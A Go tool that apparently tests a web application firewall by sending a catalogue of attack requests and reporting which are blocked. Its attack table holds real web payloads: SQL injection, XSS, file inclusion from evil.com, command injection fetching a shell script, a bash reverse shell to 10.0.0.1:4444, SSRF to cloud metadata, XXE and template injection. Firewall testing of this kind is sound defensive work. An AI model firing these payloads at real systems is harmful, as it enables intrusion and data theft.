// Package main is the Obsidian WAF Attack Simulator.
// It fires real HTTP requests for every rule category and reports
// which attacks are BLOCKED (403) vs MISSED (2xx/other).
//
// Usage:
//
//	go run ./cmd/attacksim -target http://localhost:8082
//	go run ./cmd/attacksim -target http://localhost:8082 -concurrency 20 -delay 50
package main

import (
	"flag"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"sort"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// ──────────────────────────────────────────────────────────────────────────────
// ANSI colour helpers
// ──────────────────────────────────────────────────────────────────────────────

const (
	colReset  = "\033[0m"
	colRed    = "\033[31m"
	colGreen  = "\033[32m"
	colYellow = "\033[33m"
	colCyan   = "\033[36m"
	colBold   = "\033[1m"
	colGray   = "\033[90m"
)

func red(s string) string    { return colRed + s + colReset }
func green(s string) string  { return colGreen + s + colReset }
func yellow(s string) string { return colYellow + s + colReset }
func cyan(s string) string   { return colCyan + s + colReset }
func bold(s string) string   { return colBold + s + colReset }
func gray(s string) string   { return colGray + s + colReset }

// ──────────────────────────────────────────────────────────────────────────────
// Attack definitions
// Each attack maps to one or more rule IDs it should trigger.
// ──────────────────────────────────────────────────────────────────────────────

type attackCase struct {
	// ID is a short unique label.
	id string
	// RuleIDs lists which rule(s) this should trigger.
	ruleIDs []int
	// Category is the OWASP/rule category.
	category string
	// Method is the HTTP method (default GET).
	method string
	// Path is the URL path+query string appended to target.
	path string
	// Headers to send with the request.
	headers map[string]string
	// Body is sent when method is POST/PUT.
	body string
	// WantBlocked: true means we expect a 403 from the WAF.
	wantBlocked bool
	// Benign: these are legitimate requests — must NOT be blocked.
	benign bool
}

var attacks = []attackCase{
	// ── BENIGN (should pass) ────────────────────────────────────────────────
	{id: "BENIGN-01", category: "Benign", method: "GET", path: "/api/health", benign: true,
		wantBlocked: false},
	{id: "BENIGN-02", category: "Benign", method: "GET", path: "/", benign: true,
		wantBlocked: false},
	{id: "BENIGN-03", category: "Benign", method: "GET", path: "/login", benign: true,
		wantBlocked: false},

	// ── 900xxx TEST RULE ────────────────────────────────────────────────────
	{id: "TEST-RULE", ruleIDs: []int{900001}, category: "Test",
		path: "/?attack=test", wantBlocked: true},

	// ── 910xxx PROTOCOL VIOLATIONS ─────────────────────────────────────────
	{id: "PROTO-BadMethod", ruleIDs: []int{910100}, category: "Protocol",
		method: "HACK", path: "/", wantBlocked: true},
	{id: "PROTO-NullByte", ruleIDs: []int{910110}, category: "Protocol",
		path: "/page%00.php", wantBlocked: true},
	{id: "PROTO-CRLF", ruleIDs: []int{910120}, category: "Protocol",
		path: "/redirect%0d%0aLocation:evil.com", wantBlocked: true},

	// ── 913xxx SCANNER DETECTION ────────────────────────────────────────────
	{id: "SCAN-Sqlmap", ruleIDs: []int{913100}, category: "Scanner",
		path: "/", headers: map[string]string{"User-Agent": "sqlmap/1.7.11"}, wantBlocked: true},
	{id: "SCAN-Nikto", ruleIDs: []int{913100}, category: "Scanner",
		path: "/", headers: map[string]string{"User-Agent": "Nikto/2.1.6"}, wantBlocked: true},
	{id: "SCAN-Nmap", ruleIDs: []int{913100}, category: "Scanner",
		path: "/", headers: map[string]string{"User-Agent": "Nmap Scripting Engine"}, wantBlocked: true},
	{id: "SCAN-Metasploit", ruleIDs: []int{913100}, category: "Scanner",
		path: "/", headers: map[string]string{"User-Agent": "Metasploit"}, wantBlocked: true},
	{id: "SCAN-PythonReq", ruleIDs: []int{913110}, category: "Scanner",
		path: "/", headers: map[string]string{"User-Agent": "python-requests/2.31"}, wantBlocked: false},
	{id: "SCAN-EmptyUA", ruleIDs: []int{913120}, category: "Scanner",
		path: "/", headers: map[string]string{"User-Agent": ""}, wantBlocked: false},

	// ── 920xxx PROTOCOL ANOMALIES ───────────────────────────────────────────
	{id: "ANOMALY-.htaccess", ruleIDs: []int{920100}, category: "ProtoAnomaly",
		path: "/.htaccess", wantBlocked: true},
	{id: "ANOMALY-.env", ruleIDs: []int{920100}, category: "ProtoAnomaly",
		path: "/.env", wantBlocked: true},
	{id: "ANOMALY-.git", ruleIDs: []int{920130}, category: "ProtoAnomaly",
		path: "/.git/config", wantBlocked: true},
	{id: "ANOMALY-BackupSQL", ruleIDs: []int{920100}, category: "ProtoAnomaly",
		path: "/backup.sql", wantBlocked: true},
	{id: "ANOMALY-SwapFile", ruleIDs: []int{920120}, category: "ProtoAnomaly",
		path: "/index.php.bak", wantBlocked: true},

	// ── 930xxx LOCAL FILE INCLUSION (LFI) ───────────────────────────────────
	{id: "LFI-DotDot", ruleIDs: []int{930100}, category: "LFI",
		path: "/page?file=../../../etc/passwd", wantBlocked: true},
	{id: "LFI-DotDotEncoded", ruleIDs: []int{930100}, category: "LFI",
		path: "/page?file=..%2F..%2F..%2Fetc%2Fshadow", wantBlocked: true},
	{id: "LFI-EtcPasswd", ruleIDs: []int{930110}, category: "LFI",
		path: "/read?f=/etc/passwd", wantBlocked: true},
	{id: "LFI-EtcShadow", ruleIDs: []int{930110}, category: "LFI",
		path: "/read?f=/etc/shadow", wantBlocked: true},
	{id: "LFI-BootIni", ruleIDs: []int{930120}, category: "LFI",
		path: "/read?f=C:/boot.ini", wantBlocked: true},
	{id: "LFI-WinSystem32", ruleIDs: []int{930120}, category: "LFI",
		path: "/page?f=windows/system32/cmd.exe", wantBlocked: true},
	{id: "LFI-ProcSelf", ruleIDs: []int{930130}, category: "LFI",
		path: "/read?f=/proc/self/environ", wantBlocked: true},
	{id: "LFI-PhpWrapper", ruleIDs: []int{930140}, category: "LFI",
		path: "/page?file=php://filter/read=convert.base64-encode/resource=index.php", wantBlocked: true},
	{id: "LFI-DataWrapper", ruleIDs: []int{930140}, category: "LFI",
		path: "/page?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==", wantBlocked: true},

	// ── 931xxx REMOTE FILE INCLUSION (RFI) ──────────────────────────────────
	{id: "RFI-HTTP", ruleIDs: []int{931100}, category: "RFI",
		path: "/page?file=http://evil.com/shell.php", wantBlocked: true},
	{id: "RFI-FTP", ruleIDs: []int{931100}, category: "RFI",
		path: "/page?file=ftp://attacker.com/backdoor.php", wantBlocked: true},
	{id: "RFI-URLEncoded", ruleIDs: []int{931110}, category: "RFI",
		path: "/page?url=http%3a%2f%2fevil.com%2fshell", wantBlocked: true},

	// ── 932xxx COMMAND INJECTION (RCE) ──────────────────────────────────────
	{id: "RCE-CatLs", ruleIDs: []int{932100}, category: "RCE",
		path: "/exec?cmd=id;cat+/etc/passwd", wantBlocked: true},
	{id: "RCE-Wget", ruleIDs: []int{932100}, category: "RCE",
		path: "/ping?host=127.0.0.1|wget+http://evil.com/shell.sh", wantBlocked: true},
	{id: "RCE-CmdSubstitution", ruleIDs: []int{932110}, category: "RCE",
		path: "/cmd?q=%24(id)", wantBlocked: true},
	{id: "RCE-Whoami", ruleIDs: []int{932120}, category: "RCE",
		path: "/run?cmd=;whoami", wantBlocked: true},
	{id: "RCE-SystemCmd", ruleIDs: []int{932120}, category: "RCE",
		path: "/exec?c=|hostname", wantBlocked: true},
	{id: "RCE-ShellExec", ruleIDs: []int{932130}, category: "RCE",
		path: "/api?x=shell_exec(id)", wantBlocked: true},
	{id: "RCE-System", ruleIDs: []int{932130}, category: "RCE",
		path: "/api?x=system(cat+/etc/passwd)", wantBlocked: true},
	{id: "RCE-BinBash", ruleIDs: []int{932140}, category: "RCE",
		path: "/exec?sh=/bin/bash+-i+>&+/dev/tcp/10.0.0.1/4444+0>&1", wantBlocked: true},
	{id: "RCE-PowerShell", ruleIDs: []int{932140}, category: "RCE",
		path: "/exec?cmd=powershell.exe+-ExecutionPolicy+Bypass", wantBlocked: true},

	// ── 933xxx PHP INJECTION ────────────────────────────────────────────────
	{id: "PHP-Tag", ruleIDs: []int{933100}, category: "PHP",
		path: "/upload?code=<?php+phpinfo();+?>", wantBlocked: true},
	{id: "PHP-Eval", ruleIDs: []int{933110}, category: "PHP",
		path: "/api?x=eval(base64_decode(payload))", wantBlocked: true},
	{id: "PHP-Assert", ruleIDs: []int{933110}, category: "PHP",
		path: "/api?x=assert(system(id))", wantBlocked: true},
	{id: "PHP-Base64Decode", ruleIDs: []int{933120}, category: "PHP",
		path: "/api?x=base64_decode(cGhwaW5mbygpOw==)", wantBlocked: true},
	{id: "PHP-Include", ruleIDs: []int{933130}, category: "PHP",
		path: "/api?page=include(../../shell.php)", wantBlocked: true},

	// ── 934xxx NODE.JS INJECTION ────────────────────────────────────────────
	{id: "NODE-Require", ruleIDs: []int{934100}, category: "NodeJS",
		path: "/api?x=require('child_process').exec('id')", wantBlocked: true},
	{id: "NODE-ChildProcess", ruleIDs: []int{934100}, category: "NodeJS",
		path: "/api?m=child_process", wantBlocked: true},
	{id: "NODE-ProcessEnv", ruleIDs: []int{934110}, category: "NodeJS",
		path: "/api?x=process.env.SECRET", wantBlocked: true},
	{id: "NODE-ProcessKill", ruleIDs: []int{934110}, category: "NodeJS",
		path: "/api?x=process.kill(1)", wantBlocked: true},

	// ── 941xxx XSS ──────────────────────────────────────────────────────────
	{id: "XSS-ScriptTag", ruleIDs: []int{941100}, category: "XSS",
		path: "/search?q=<script>alert(1)</script>", wantBlocked: true},
	{id: "XSS-ScriptEncoded", ruleIDs: []int{941100}, category: "XSS",
		path: "/search?q=%3Cscript%3Ealert(1)%3C/script%3E", wantBlocked: true},
	{id: "XSS-JavascriptProto", ruleIDs: []int{941110}, category: "XSS",
		path: "/link?href=javascript:alert(document.cookie)", wantBlocked: true},
	{id: "XSS-VbscriptProto", ruleIDs: []int{941110}, category: "XSS",
		path: "/link?href=vbscript:msgbox('xss')", wantBlocked: true},
	{id: "XSS-DataHTML", ruleIDs: []int{941110}, category: "XSS",
		path: "/link?href=data:text/html,<script>alert(1)</script>", wantBlocked: true},
	{id: "XSS-OnError", ruleIDs: []int{941120}, category: "XSS",
		path: "/page?img=<img+onerror=alert(1)+src=x>", wantBlocked: true},
	{id: "XSS-OnClick", ruleIDs: []int{941120}, category: "XSS",
		path: "/btn?x=<button+onclick=steal()>click</button>", wantBlocked: true},
	{id: "XSS-OnLoad", ruleIDs: []int{941120}, category: "XSS",
		path: "/frm?x=<body+onload=alert(1)>", wantBlocked: true},
	{id: "XSS-CSSExpr", ruleIDs: []int{941130}, category: "XSS",
		path: "/style?c=body{expression(alert(1))}", wantBlocked: true},
	{id: "XSS-AlertFunc", ruleIDs: []int{941140}, category: "XSS",
		path: "/page?f=alert(document.cookie)", wantBlocked: true},
	{id: "XSS-InnerHTML", ruleIDs: []int{941140}, category: "XSS",
		path: "/api?f=.innerHTML=<img+src=x+onerror=alert(1)>", wantBlocked: true},
	{id: "XSS-IFrame", ruleIDs: []int{941150}, category: "XSS",
		path: "/page?tag=<iframe+src=http://evil.com>", wantBlocked: true},
	{id: "XSS-FormTag", ruleIDs: []int{941150}, category: "XSS",
		path: "/page?tag=<form+action=http://evil.com>", wantBlocked: true},
	{id: "XSS-FromCharCode", ruleIDs: []int{941170}, category: "XSS",
		path: "/api?j=String.fromCharCode(60,115,99)", wantBlocked: true},

	// ── 942xxx SQL INJECTION ────────────────────────────────────────────────
	{id: "SQLI-BoolOr", ruleIDs: []int{942100}, category: "SQLi",
		path: "/login?id=1+or+1=1", wantBlocked: true},
	{id: "SQLI-BoolAnd", ruleIDs: []int{942100}, category: "SQLi",
		path: "/login?id=1+and+1=1", wantBlocked: true},
	{id: "SQLI-StringOr", ruleIDs: []int{942110}, category: "SQLi",
		path: "/login?user=admin'or'1'='1", wantBlocked: true},
	{id: "SQLI-UnionSelect", ruleIDs: []int{942120}, category: "SQLi",
		path: "/item?id=1+UNION+SELECT+username,password+FROM+users", wantBlocked: true},
	{id: "SQLI-UnionAllSelect", ruleIDs: []int{942120}, category: "SQLi",
		path: "/item?id=1+UNION+ALL+SELECT+null,null--", wantBlocked: true},
	{id: "SQLI-Comment--", ruleIDs: []int{942130}, category: "SQLi",
		path: "/login?user=admin'--", wantBlocked: true},
	{id: "SQLI-Comment#", ruleIDs: []int{942130}, category: "SQLi",
		path: "/login?user=admin%23pass", wantBlocked: true},
	{id: "SQLI-SelectFrom", ruleIDs: []int{942140}, category: "SQLi",
		path: "/page?q=SELECT+username+FROM+users", wantBlocked: true},
	{id: "SQLI-InsertInto", ruleIDs: []int{942140}, category: "SQLi",
		path: "/page?q=INSERT+INTO+users+VALUES('hacker','pw')", wantBlocked: true},
	{id: "SQLI-DropTable", ruleIDs: []int{942140}, category: "SQLi",
		path: "/page?q=DROP+TABLE+users", wantBlocked: true},
	{id: "SQLI-ExecXP", ruleIDs: []int{942150}, category: "SQLi",
		path: "/search?q=exec+xp_cmdshell+'whoami'", wantBlocked: true},
	{id: "SQLI-Sleep", ruleIDs: []int{942160}, category: "SQLi",
		path: "/search?q=1'+AND+sleep(5)--", wantBlocked: true},
	{id: "SQLI-WaitFor", ruleIDs: []int{942160}, category: "SQLi",
		path: "/search?q=1;waitfor+delay+'0:0:5'--", wantBlocked: true},
	{id: "SQLI-LoadFile", ruleIDs: []int{942170}, category: "SQLi",
		path: "/page?q=SELECT+load_file('/etc/passwd')", wantBlocked: true},
	{id: "SQLI-InfoSchema", ruleIDs: []int{942170}, category: "SQLi",
		path: "/api?q=SELECT+table_name+FROM+information_schema.tables", wantBlocked: true},
	{id: "SQLI-Concat", ruleIDs: []int{942180}, category: "SQLi",
		path: "/api?q=SELECT+concat(username,0x3a,password)+FROM+users", wantBlocked: false}, // log only, action=log
	{id: "SQLI-OrderBy", ruleIDs: []int{942190}, category: "SQLi",
		path: "/api?q=1+ORDER+BY+1--", wantBlocked: true},
	{id: "SQLI-GroupBy", ruleIDs: []int{942190}, category: "SQLi",
		path: "/api?q=1+GROUP+BY+1+HAVING+1", wantBlocked: true},

	// ── 943xxx SESSION FIXATION ─────────────────────────────────────────────
	{id: "SESS-PHPSESSID", ruleIDs: []int{943100}, category: "Session",
		path: "/login?PHPSESSID=abc123", wantBlocked: true},
	{id: "SESS-JSESSIONID", ruleIDs: []int{943100}, category: "Session",
		path: "/app?JSESSIONID=DEADBEEF0001", wantBlocked: true},

	// ── 944xxx JAVA DESERIALIZATION ─────────────────────────────────────────
	{id: "JAVA-ClassInject", ruleIDs: []int{944100}, category: "Java",
		path: "/api?cls=java.lang.Runtime.getRuntime().exec('id')", wantBlocked: true},
	{id: "JAVA-Apache", ruleIDs: []int{944100}, category: "Java",
		path: "/api?cls=org.apache.commons.exec", wantBlocked: true},
	{id: "JAVA-SerObj", ruleIDs: []int{944110}, category: "Java",
		path: "/api?data=rO0ABXNyAA==", wantBlocked: true},

	// ── 950xxx DATA LEAKAGE ─────────────────────────────────────────────────
	{id: "LEAK-PasswordURL", ruleIDs: []int{950100}, category: "DataLeak",
		path: "/api?password=secret123", wantBlocked: false}, // nosec G101 - This is a test case for a data leak, not a real credential.

	// ── 951xxx SSRF ──────────────────────────────────────────────────────────
	{id: "SSRF-Localhost", ruleIDs: []int{951100}, category: "SSRF",
		path: "/fetch?url=http://127.0.0.1/admin", wantBlocked: true},
	{id: "SSRF-CloudMeta", ruleIDs: []int{951110}, category: "SSRF",
		path: "/fetch?url=http://169.254.169.254/latest/meta-data/", wantBlocked: true},
	{id: "SSRF-AzureMeta", ruleIDs: []int{951110}, category: "SSRF",
		path: "/fetch?url=http://metadata.azure.internal/", wantBlocked: true},

	// ── 952xxx XXE ─────────────────────────────────────────────────────────
	{id: "XXE-DOCTYPE", ruleIDs: []int{952100}, category: "XXE",
		path: "/xml?q=<!DOCTYPE+foo+[<!ENTITY+xxe+SYSTEM+'file:///etc/passwd'>]>", wantBlocked: true},
	{id: "XXE-ENTITY", ruleIDs: []int{952100}, category: "XXE",
		path: "/xml?q=<!ENTITY+xxe+SYSTEM+'file:///etc/shadow'>", wantBlocked: true},

	// ── 953xxx LDAP INJECTION ───────────────────────────────────────────────
	{id: "LDAP-Inject", ruleIDs: []int{953100}, category: "LDAP",
		path: "/search?user=*)(|(uid=*)", wantBlocked: true},

	// ── 954xxx SSTI ────────────────────────────────────────────────────────
	{id: "SSTI-PythonClass", ruleIDs: []int{954110}, category: "SSTI",
		path: "/template?t={{+''.__class__.__mro__[1].__subclasses__()[141]() }}", wantBlocked: true},
	{id: "SSTI-Globals", ruleIDs: []int{954110}, category: "SSTI",
		path: "/template?t={{+request.__class__.__globals__['os'].popen('id').read() }}", wantBlocked: true},
}

// ──────────────────────────────────────────────────────────────────────────────
// Result
// ──────────────────────────────────────────────────────────────────────────────

type result struct {
	attack     attackCase
	statusCode int
	blocked    bool
	pass       bool // true = result matched expectation
	err        string
	duration   time.Duration
}

// ──────────────────────────────────────────────────────────────────────────────
// main
// ──────────────────────────────────────────────────────────────────────────────

func main() {
	target := flag.String("target", "http://localhost:8082", "WAF base URL")
	concurrency := flag.Int("concurrency", 5, "Parallel attack goroutines")
	delayMs := flag.Int("delay", 30, "Delay between requests in ms (0 = no delay)")
	filterCat := flag.String("category", "", "Only run attacks of this category (e.g. SQLi, XSS)")
	onlyFail := flag.Bool("failures", false, "Only print failures (missed/unexpected blocks)")
	flag.Parse()

	// Filter if requested.
	toRun := attacks
	if *filterCat != "" {
		toRun = nil
		for _, a := range attacks {
			if strings.EqualFold(a.category, *filterCat) {
				toRun = append(toRun, a)
			}
		}
	}

	banner(*target, len(toRun), *concurrency)

	client := &http.Client{
		Timeout: 10 * time.Second,
		CheckRedirect: func(_ *http.Request, _ []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	sem := make(chan struct{}, *concurrency)
	results := make([]result, len(toRun))
	var wg sync.WaitGroup
	var done int64

	for i, atk := range toRun {
		wg.Add(1)
		sem <- struct{}{}
		go func(idx int, a attackCase) {
			defer wg.Done()
			defer func() { <-sem }()

			if *delayMs > 0 {
				time.Sleep(time.Duration(*delayMs) * time.Millisecond)
			}

			r := fire(client, *target, a)
			results[idx] = r

			n := atomic.AddInt64(&done, 1)
			printLine(r, *onlyFail, n, int64(len(toRun)))
		}(i, atk)
	}
	wg.Wait()

	printSummary(results)
}

// ──────────────────────────────────────────────────────────────────────────────
// fire sends one HTTP request and returns a result.
// ──────────────────────────────────────────────────────────────────────────────

func fire(client *http.Client, target string, a attackCase) result {
	method := a.method
	if method == "" {
		method = "GET"
	}

	rawURL := target + a.path
	// Re-encode the URL to ensure it is valid; keep raw special chars.
	u, err := url.Parse(rawURL)
	if err != nil {
		return result{attack: a, err: fmt.Sprintf("bad URL: %v", err)}
	}

	req, err := http.NewRequest(method, u.String(), strings.NewReader(a.body))
	if err != nil {
		return result{attack: a, err: fmt.Sprintf("bad request: %v", err)}
	}

	// Common headers.
	req.Header.Set("User-Agent", "ObsidianAttackSim/1.0")
	req.Header.Set("Accept", "*/*")
	if a.body != "" {
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}
	// Apply per-attack header overrides.
	for k, v := range a.headers {
		if v == "" {
			req.Header.Del(k)
		} else {
			req.Header.Set(k, v)
		}
	}

	start := time.Now()
	resp, err := client.Do(req)
	dur := time.Since(start)
	if err != nil {
		return result{attack: a, err: fmt.Sprintf("request error: %v", err), duration: dur}
	}
	resp.Body.Close()

	blocked := resp.StatusCode == 403 || resp.StatusCode == 405
	passed := blocked == a.wantBlocked

	return result{
		attack:     a,
		statusCode: resp.StatusCode,
		blocked:    blocked,
		pass:       passed,
		duration:   dur,
	}
}

// ──────────────────────────────────────────────────────────────────────────────
// printLine writes one result line.
// ──────────────────────────────────────────────────────────────────────────────

func printLine(r result, onlyFail bool, n, total int64) {
	if onlyFail && r.pass {
		return
	}

	// Status pill.
	var statusPill string
	switch {
	case r.err != "":
		statusPill = yellow(" ERR  ")
	case r.attack.benign && r.blocked:
		statusPill = red(" FALSEPOSITIVE ")
	case r.attack.benign && !r.blocked:
		statusPill = green(" PASS(benign)  ")
	case r.blocked && r.attack.wantBlocked:
		statusPill = green(" BLOCKED ✓ ")
	case !r.blocked && !r.attack.wantBlocked:
		statusPill = cyan(" LOGGED ✓  ")
	case !r.blocked && r.attack.wantBlocked:
		statusPill = red(" MISSED ✗  ")
	default:
		statusPill = yellow(" UNEXPECTED ")
	}

	codeStr := gray("---")
	if r.statusCode != 0 {
		switch {
		case r.statusCode == 403 || r.statusCode == 405:
			codeStr = red(fmt.Sprintf("%d", r.statusCode))
		case r.statusCode >= 200 && r.statusCode < 300:
			codeStr = green(fmt.Sprintf("%d", r.statusCode))
		default:
			codeStr = yellow(fmt.Sprintf("%d", r.statusCode))
		}
	}

	extra := ""
	if r.err != "" {
		extra = gray(" → " + r.err)
	}

	progress := gray(fmt.Sprintf("[%3d/%-3d]", n, total))
	fmt.Printf("%s %s [%s] %-30s %4dms%s\n",
		progress,
		statusPill,
		codeStr,
		bold(r.attack.id),
		r.duration.Milliseconds(),
		extra,
	)
}

// ──────────────────────────────────────────────────────────────────────────────
// printSummary writes the final summary table.
// ──────────────────────────────────────────────────────────────────────────────

func printSummary(results []result) {
	type catStats struct {
		total, blocked, missed, logged, errors, falsePos int
	}
	cats := map[string]*catStats{}

	var (
		totalAttacks = 0
		totalBlocked = 0
		totalMissed  = 0
		totalLogged  = 0
		totalErrors  = 0
		totalFalseP  = 0
	)

	var missedList []string
	var falsePosList []string

	for _, r := range results {
		if r.attack.benign {
			if r.blocked {
				totalFalseP++
				falsePosList = append(falsePosList, r.attack.id)
			}
			continue
		}
		totalAttacks++
		cat := r.attack.category
		if cats[cat] == nil {
			cats[cat] = &catStats{}
		}
		c := cats[cat]
		c.total++

		if r.err != "" {
			c.errors++
			totalErrors++
			continue
		}

		if r.blocked && r.attack.wantBlocked {
			c.blocked++
			totalBlocked++
		} else if !r.blocked && !r.attack.wantBlocked {
			c.logged++
			totalLogged++
		} else if !r.blocked && r.attack.wantBlocked {
			c.missed++
			totalMissed++
			missedList = append(missedList, r.attack.id)
		}
	}

	// Sort categories.
	catNames := make([]string, 0, len(cats))
	for k := range cats {
		catNames = append(catNames, k)
	}
	sort.Strings(catNames)

	fmt.Println()
	fmt.Println(bold(cyan("══════════════════════════════════════════════════════")))
	fmt.Println(bold(cyan("  OBSIDIAN WAF − ATTACK SIMULATION SUMMARY")))
	fmt.Println(bold(cyan("══════════════════════════════════════════════════════")))
	fmt.Printf(" %-16s  %6s  %7s  %6s  %6s\n",
		bold("Category"), bold("Total"), bold("Blocked"), bold("Logged"), bold("Missed"))
	fmt.Println(gray(" ────────────────────────────────────────────────────"))

	for _, name := range catNames {
		c := cats[name]
		missedStr := ""
		if c.missed > 0 {
			missedStr = red(fmt.Sprintf("%6d", c.missed))
		} else {
			missedStr = green(fmt.Sprintf("%6d", c.missed))
		}
		fmt.Printf(" %-16s  %6d  %7d  %6d  %s\n",
			name, c.total, c.blocked, c.logged, missedStr)
	}

	fmt.Println(gray(" ────────────────────────────────────────────────────"))
	detRate := 0
	if totalAttacks > 0 {
		detRate = (totalBlocked + totalLogged) * 100 / totalAttacks
	}
	fmt.Printf(" %-16s  %6d  %7d  %6d  %s\n",
		bold("TOTAL"),
		totalAttacks,
		totalBlocked,
		totalLogged,
		func() string {
			if totalMissed > 0 {
				return red(fmt.Sprintf("%6d", totalMissed))
			}
			return green(fmt.Sprintf("%6d", totalMissed))
		}(),
	)
	fmt.Println()
	fmt.Printf(" Detection Rate : %s\n", func() string {
		s := fmt.Sprintf("%d%%", detRate)
		if detRate >= 95 {
			return green(s)
		} else if detRate >= 80 {
			return yellow(s)
		}
		return red(s)
	}())
	fmt.Printf(" Errors         : %s\n", yellow(fmt.Sprintf("%d", totalErrors)))
	fmt.Printf(" False Positives: %s\n", func() string {
		if totalFalseP > 0 {
			return red(fmt.Sprintf("%d", totalFalseP))
		}
		return green("0")
	}())

	if len(missedList) > 0 {
		fmt.Println()
		fmt.Println(red(bold("  ✗ MISSED ATTACKS (not blocked by WAF):")))
		for _, id := range missedList {
			fmt.Printf("    • %s\n", red(id))
		}
	}

	if len(falsePosList) > 0 {
		fmt.Println()
		fmt.Println(yellow(bold("  ⚠ FALSE POSITIVES (benign traffic blocked):")))
		for _, id := range falsePosList {
			fmt.Printf("    • %s\n", yellow(id))
		}
	}

	fmt.Println()
	if totalMissed == 0 && totalFalseP == 0 {
		fmt.Println(green(bold("  ✓ All rules are registered and firing correctly!")))
	} else {
		fmt.Println(yellow(bold("  ⚠ Review missed attacks — rules may need tuning.")))
	}
	fmt.Println(bold(cyan("══════════════════════════════════════════════════════")))
	fmt.Println()
}

// ──────────────────────────────────────────────────────────────────────────────
// banner prints the startup splash.
// ──────────────────────────────────────────────────────────────────────────────

func banner(target string, total, concurrency int) {
	fmt.Println()
	fmt.Println(bold(cyan("╔══════════════════════════════════════════════════════╗")))
	fmt.Println(bold(cyan("║   OBSIDIAN WAF — ATTACK SIMULATION ENGINE  v1.0     ║")))
	fmt.Println(bold(cyan("╚══════════════════════════════════════════════════════╝")))
	fmt.Println()
	fmt.Printf("  Target      : %s\n", bold(target))
	fmt.Printf("  Attacks     : %s\n", bold(fmt.Sprintf("%d", total)))
	fmt.Printf("  Concurrency : %s\n", bold(fmt.Sprintf("%d goroutines", concurrency)))
	fmt.Printf("  Categories  : SQLi, XSS, LFI, RFI, RCE, PHP, NodeJS,\n")
	fmt.Printf("                SSRF, XXE, SSTI, LDAP, Java, Session, Scanner,\n")
	fmt.Printf("                Protocol, ProtoAnomaly, DataLeak, Test, Benign\n")
	fmt.Println()
	fmt.Println(gray("  Make sure the WAF server is running before proceeding."))
	fmt.Println()

	// Prompt confirmation so nobody accidentally fires at a wrong host.
	if !isTerminal() {
		return
	}
	fmt.Printf("  %s\n\n  Proceed? [y/N] ", yellow("WARNING: This fires real attack payloads at the target."))
	var ans string
	fmt.Scanln(&ans)
	if !strings.EqualFold(strings.TrimSpace(ans), "y") {
		fmt.Println(gray("  Aborted."))
		os.Exit(0)
	}
	fmt.Println()
}

func isTerminal() bool {
	fi, err := os.Stdin.Stat()
	if err != nil {
		return false
	}
	return (fi.Mode() & os.ModeCharDevice) != 0
}
